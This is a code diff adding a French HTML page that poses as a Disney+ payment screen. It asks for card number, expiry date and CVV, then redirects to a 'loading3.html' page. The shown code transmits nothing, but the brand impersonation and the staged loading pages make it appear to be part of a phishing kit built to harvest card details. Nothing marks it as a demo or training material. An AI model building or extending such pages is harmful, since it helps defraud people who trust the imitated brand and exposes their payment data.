@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Paiement | Disney+</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <header><img src="Images/logo-disney.png" class="logo" /></header>
+  <main class="form-container">
+    <h1>Informations bancaires</h1>
+    <form id="paymentForm">
+      <input type="text" placeholder="Numéro de carte" required />
+      <input type="text" placeholder="MM/AA" required />
+      <input type="text" placeholder="CVV" required />
+      <button type="submit">Payer</button>
+    </form>
+  </main>
+  <script>
+    document.getElementById('paymentForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      setTimeout(() => { window.location.href = "loading3.html"; }, 500);
+    });
+  </script>
+</body>
+</html>
